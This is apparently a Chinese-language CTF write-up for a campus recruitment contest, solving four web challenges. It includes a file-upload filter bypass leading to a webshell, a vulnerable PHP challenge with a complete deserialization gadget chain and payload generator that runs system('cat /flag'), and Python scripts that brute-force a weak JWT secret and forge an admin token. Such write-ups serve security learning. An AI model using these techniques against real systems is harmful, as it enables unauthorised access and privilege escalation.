---
title: 校内招新赛 Web 题解
date: 2026-04-15 10:00:00
author: Xendr1a
categories: [CTF题解, 校内赛]
tags: [Writeup, 校内赛]
description: 校内招新赛 Web 题：55182 猜数字、upload、反序列化与 luffyx 的完整题解。
toc: true
---
## 55182到底是什么呢，好难猜啊

55182，直接找cve了，查关键词直接复现了

https://blog.csdn.net/lingggggaaaa/article/details/155617904

![9d940290-2839-489a-aa59-7a4f53842e5e-20260314191259-n6oyevy](/img/campus-2025/img-01.png)

## upload

前端限制了，直接bp发包

![e1330933-baaa-4f78-a810-6a101cdf2204-20260315191113-ip1k83t](/img/campus-2025/img-02.png)

测了一下发现会把.php给吃了

![5b349e3e-8812-41cc-b135-d4fe72ee23ce-20260315191319-9eq72nj](/img/campus-2025/img-03.png)

上传成功后面直接蚁剑或者命令执行都行

## 什么叫取经要反序列化

前端hidden了个框，删除掉就行

![0269032e-1bab-43a8-a049-6c7422b09d22-20260314142322-aorz6kk](/img/campus-2025/img-04.png)

进来第二关

```text
<?php

session_start();
error_reporting(0);
$ok = isset($_SESSION['passed'], $_SESSION['token'], $_SESSION['token_expires'])
    && $_SESSION['passed'] === true
    && $_SESSION['token_expires'] >= time();

if (!$ok) {
    header('Location: index.php');
    exit;
}
highlight_file(__FILE__);


class Pansidong{
    public $wu="区区盘丝洞不过如此.<br>";
    public $zhi;
    function __toString(){
        echo "白骨精被你打败了.<br>";
        $baigujing=$this->zhi;
        return $baigujing();
    }
}

class xitianqujing{
    public $qujing;
    function __construct($qujing){
        $this->qujing=$qujing;
    }
    function __destruct(){
        echo "西天取经的路才刚刚开始";
        echo $this->qujing;
    }
}

class Huoyanshan {
    public $niumowang;
    function __invoke(){
        echo "火焰山之难";
        echo $this->niumowang->honghaier;
    }
    function __get($i){
        echo "你能闯过这一难吗？";
    }
}

class Zhenjing{
    public $fozu;
    function __get($j){
        if((is_string($this->fozu)) == (md5(is_string($this->fozu)))){
            echo "成功取得真经";
            system('cat /flag');
        }
    }
}

$raw = $_POST['sun'] ?? '';

if (strpos($raw, 'a:') !== false || strpos($raw, '__PHP_Incomplete_Class') !== false){
    exit("尔等六二猕猴还不快快显出原型");
}

$web = unserialize($raw);
throw new Exception('开局一根棍，一路全靠打。');
```

链子挺明显的，触发点是异常抛出后对象析构

```text
xitianqujing::__destruct() -> echo $this->qujing -> Pansidong::__toString() -> $this->zhi() -> Huoyanshan::__invoke() -> $this->niumowang->honghaier -> Zhenjing::__get() -> system('cat /flag')
```

```text
<?php

class Pansidong {
    public $wu = "";
    public $zhi;
}

class xitianqujing {
    public $qujing;
}

class Huoyanshan {
    public $niumowang;
}

class Zhenjing {
    public $fozu;
}

$zhenjing = new Zhenjing();
$zhenjing->fozu = "1";
$huoyanshan = new Huoyanshan();
$huoyanshan->niumowang = $zhenjing;
$pansidong = new Pansidong();
$pansidong->zhi = $huoyanshan;
$xitianqujing = new xitianqujing();
$xitianqujing->qujing = $pansidong;
$payload = serialize($xitianqujing);
echo $payload . PHP_EOL;
```

## 喝多了的 luffyx

一个管理平台，有个/api/status路由

```text
{"service":"enterprise-access-portal","status":"ok","build":"Enterprise Access Portal v3.0.0","token_scheme":"jwt-hs256","key_Format":"luffyxNN","operator_note":"luffyx那天喝多了，当他发现这个弱 token 密码的时候已经晚了，呜呜呜，请你别来真实 luffyx。","note":"记住别忘记 luffyx 前缀哦。"}
```

我们先登入，给了账户，登入进去jwt直接怼脸上了，

管理员界面进不去

![feaf5dd0-1c87-44c1-93a8-ef7d97c1128f-20260314135255-jwdup7w](/img/campus-2025/img-05.png)

标了要伪造个token，联系到前面的/api/status路由

直接爆破一下密钥

```text
import hmac
import hashlib
import base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCIsInJvbGUiOiJ1c2VyIiwiZGlzcGxheSI6Ilx1OGJiZlx1NWJhMlx1NzUyOFx1NjIzNyIsIm5vbmNlIjoiNzAzZGRkNjQifQ.bCC7A7mb81exuWyASjzZxsj0XwLBJ1VMXefY7l1cAOg"

header_payload, sig = token.rsplit(".", 1)

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

for i in range(100):
    secret = f"luffyx{i:02d}".encode()
    calc = hmac.new(secret, header_payload.encode(), hashlib.sha256).digest()
    if b64url(calc) == sig:
        print("end:", secret.decode())
        break

#luffyx78
```

然后就是伪造了

```text
import json
import hmac
import hashlib
import base64

secret = b"luffyx78"

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    "id": "guest",
    "username": "guest",
    "role": "admin",
    "display": "访客用户",
    "nonce": "703ddd64"
}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header_b64 = b64url(json.dumps(header, separators=(",", ":"), ensure_ascii=True).encode())
payload_b64 = b64url(json.dumps(payload, separators=(",", ":"), ensure_ascii=True).encode())

unsigned = f"{header_b64}.{payload_b64}"
signature = b64url(hmac.new(secret, unsigned.encode(), hashlib.sha256).digest())

token = f"{unsigned}.{signature}"
print(token)
```

访问/admin改token

![cae4f05d-64ce-44a2-99fc-69d26f80497b-20260314135746-2kzru10](/img/campus-2025/img-06.png)

```text
flag{demoTOKEN_token_forgery_via_weak_secret}
```
